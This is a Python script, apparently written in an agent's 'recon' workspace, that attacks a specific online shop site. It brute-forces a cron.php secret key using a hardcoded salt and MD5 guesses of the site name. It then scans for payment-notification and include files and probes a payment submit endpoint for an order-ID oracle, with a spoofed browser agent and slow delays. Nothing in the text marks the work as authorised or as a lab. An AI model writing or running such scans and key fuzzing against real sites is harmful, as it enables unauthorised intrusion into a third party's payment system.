#!/usr/bin/env python3
"""WebFetch-friendly GET probe + cron key fuzz (slow)."""
import json, time, subprocess, hashlib

BASE = "https://xinhe001.lol/shop"
HASHSALT = "8d6673bb4bde73830ed11c898186a872"
DELAY = 4
results = {"hashsalt": HASHSALT, "tests": {}}

def get(path):
    time.sleep(DELAY)
    url = f"{BASE}/{path}" if not path.startswith("http") else path
    cmd = ["curl", "-sS", "-m", "15", "-A",
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
           "-H", "Accept-Language: zh-CN,zh;q=0.9", url]
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8", "replace")[:300]
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", "replace")[:300]

# cron key fuzz
print("=== cron.php key fuzz ===")
cron_keys = [
    "", "123456", "admin", HASHSALT,
    hashlib.md5(b"xinhe001").hexdigest(),
    hashlib.md5(b"xinghe001").hexdigest(),
    "xinhe001", "xinghe001", "xinghe0010",
]
for k in cron_keys:
    body = get(f"cron.php?key={k}")
    tag = "HIT?" if "不正确" not in body and body.strip() else "miss"
    print(f"  key={k[:20]:20} -> {tag} {body[:60].replace(chr(10),' ')}")
    results["tests"][f"cron_{k[:16]}"] = body[:150]

# path scan
print("\n=== paths ===")
paths = [
    "task.php", "monitor.php", "api.php",
    "other/epay_return.php", "other/alipay_notify.php",
    "other/wxpay_notify.php", "other/usdt_notify.php",
    "includes/common.php", "template/", "upload/",
    "assets/faka/js/query.js", "assets/js/csrf.js",
]
for p in paths:
    body = get(p)
    code_hint = "404" if "404" in body[:100] else ("403" if "403" in body[:100] else "ok")
    if code_hint != "404" or len(body) < 200:
        print(f"  {p}: {code_hint} {body[:70].replace(chr(10),' ')}")
    results["tests"][p] = body[:120]

# submit oracle sample
print("\n=== submit oracle ===")
for oid in ["1", "100", "999999", "202507091200001"]:
    body = get(f"other/submit.php?type=alipay&orderid={oid}")
    print(f"  orderid={oid}: {body[body.find('请'):body.find('请')+40] if '请' in body else body[:60]}")

with open("/workspace/aaap-recon/xinhe_phase3_results.json", "w") as f:
    json.dump(results, f, ensure_ascii=False, indent=2)
print("\nDONE")
